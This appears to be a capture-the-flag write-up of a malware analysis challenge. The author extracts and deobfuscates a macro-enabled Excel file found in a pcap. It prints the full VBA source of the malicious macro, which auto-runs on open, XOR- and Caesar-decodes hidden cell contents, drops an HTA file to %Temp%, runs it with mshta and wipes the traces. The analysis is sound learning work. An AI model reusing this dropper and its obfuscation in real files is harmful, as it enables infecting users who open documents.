

Challenge starts with a pcap file  : 




HTTP objects show two things : a long string of hex encoded data that appears encrypted, and a xlsm file (excel with macro).

Since this is a malware analysis challenge, let's start with the macros. they can easily be dumped with olevba.

the macros are lightly obfuscated, but there is a pretty obvious part : 
```vba

f = Chr(72) & Chr(70) & Chr(45) & MD5Hex(Environ$(cqw543hi(Chr(54) & "" & Chr(58) & "8" & "%" & " " & Chr(33) & "0" & "'" & ";" & "" & "4" & "" & Chr(56) & "" & "0")))
'flag ^

```

This is suspicious. Unfortunately, the flag we get isn't accepted. let's deobfuscate a little bit. we can figure out the obfuscated strings dynamically, by using the vba debugger included inside excel. Modifying the code a little bit so we can place breakpoints and watches, we get this : 

```vba

f = "HF-" & MD5Hex(Environ$("computer-name"))
'flag ^

```

We need the computer name of the intended target. luckily, we have a pcap





```vba
Function gdgdewdgdg(sText As String, lngNumber As Long) As String
Dim Tbl, strGlob As String, strTemp As String, i As Long, bytAscii As Byte
Const MAJ As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const NB_LETTERS As Byte = 26
Const DIFFASCIIMAJ As Byte = 65 - NB_LETTERS
Const DIFFASCIIMIN As Byte = 97 - NB_LETTERS

strTemp = sText
If lngNumber < NB_LETTERS And lngNumber > NB_LETTERS * -1 Then
strGlob = String(NB_LETTERS * 4, " ")
LSet strGlob = MAJ & MAJ & MAJ
Tbl = Split(StrConv(strGlob, vbUnicode), Chr(0))
For i = 1 To Len(strTemp)
If Mid(strTemp, i, 1) Like "[a-zA-Z]" Then
    bytAscii = Asc(Mid(strTemp, i, 1))
    If Mid(strTemp, i, 1) = Tbl(bytAscii - DIFFASCIIMAJ) Then
        Mid(strTemp, i) = Tbl(bytAscii - DIFFASCIIMAJ + (lngNumber))
    Else
        Mid(strTemp, i) = LCase(Tbl(bytAscii - DIFFASCIIMIN + lngNumber))
    End If
End If
Next i
End If
gdgdewdgdg = strTemp
End Function


Public Function MD5Hex(textString As String) As String
Dim enc
Dim textBytes() As Byte
Dim bytes
Dim outstr As String

Set enc = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
textBytes = textString
bytes = enc.ComputeHash_2((textBytes))

For pos = 1 To LenB(bytes)
outstr = outstr & LCase(Right("0" & Hex(AscB(MidB(bytes, pos, 1))), 2))
Next
MD5Hex = outstr
Set enc = Nothing

End Function


Function fece(str As String) As Variant: Dim bytes() As Byte: bytes = str: fece = bytes: End Function
Function ng7b(bytes() As Byte) As String: Dim str As String: str = bytes: ng7b = str: End Function

Function u1dh(str As String) As Variant: Dim bytes() As Byte: bytes = str: u1dh = bytes: End Function
Function qgg8(bytes() As Byte) As String: Dim str As String: str = bytes: qgg8 = str: End Function

Function cqw543hi(str As String) As String
Const p_ As String = "k3nwekcy"
Dim sb_() As Byte, pb_() As Byte
sb_ = u1dh(str)
pb_ = u1dh(p_)

Dim uL As Long
uL = UBound(sb_)

ReDim scb_(0 To uL) As Byte

Dim idx As Long

For idx = LBound(sb_) To uL:
If Not sb_(idx) = 0 Then
c = sb_(idx)
For i = 0 To UBound(pb_):
c = c Xor pb_(i)
Next i
scb_(idx) = c
End If

Next idx

cqw543hi = qgg8(scb_)
End Function



Sub test()

f = Chr(72) & Chr(70) & Chr(45) & MD5Hex(Environ$(cqw543hi(Chr(54) & "" & Chr(58) & "8" & "%" & " " & Chr(33) & "0" & "'" & ";" & "" & "4" & "" & Chr(56) & "" & "0")))
'flag ^

Dim ct As String
Dim fz77go6o As String
Dim sljvuw9t As String
Dim a61fjadq As String
fz77go6o = Range("U" & cqw543hi("" & "d" & "" & Chr(103) & "" & Chr(102))).Value
sljvuw9t = Range("V" & cqw543hi("" & "d" & "" & "g" & "" & "f" & "")).Value
a61fjadq = Range("W" & cqw543hi("" & "" & Chr(100) & "" & Chr(103) & "" & Chr(102) & "")).Value

ct = gdgdewdgdg(fz77go6o, 14)
Range("U" & cqw543hi("" & "d" & "" & Chr(103) & "" & Chr(102))).Value = ct
ct = gdgdewdgdg(sljvuw9t, 24)
Range("V" & cqw543hi("" & "d" & "" & "g" & "" & "f" & "")).Value = ct
ct = gdgdewdgdg(a61fjadq, 14)
Range("W" & cqw543hi("" & "" & Chr(100) & "" & Chr(103) & "" & Chr(102) & "")).Value = ct

Set o = CreateObject("Wscript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
Dim p
p = o.ExpandEnvironmentStrings("%Temp%")
Set fs = CreateObject("Scripting.FileSystemObject")
Set A = fs.CreateTextFile(p & "\esfegserg.htm", True)
A.WriteLine (Range("U" & cqw543hi("" & "d" & "" & Chr(103) & "" & Chr(102))).Value)
A.WriteLine (Range("V" & cqw543hi("" & "d" & "" & "g" & "" & "f" & "")).Value)
A.WriteLine (Range("W" & cqw543hi("" & "" & Chr(100) & "" & Chr(103) & "" & Chr(102) & "")).Value)
A.Close
o.Run ("mshta " & p & "\esfegserg.htm")
Application.Wait (Now + TimeValue("0:00:10"))
Set b = fs.CreateTextFile(p & "\esfegserg.htm", True)
b.WriteLine (".")
b.Close
Range("U" & cqw543hi("" & "d" & "" & Chr(103) & "" & Chr(102))).Value = "."
ct = gdgdewdgdg(sljvuw9t, 24)
Range("V" & cqw543hi("" & "d" & "" & "g" & "" & "f" & "")).Value = "."
ct = gdgdewdgdg(a61fjadq, 14)
Range("W" & cqw543hi("" & "" & Chr(100) & "" & Chr(103) & "" & Chr(102) & "")).Value = "."
End Sub

Private Sub Workbook_Open()
test
End Sub
```
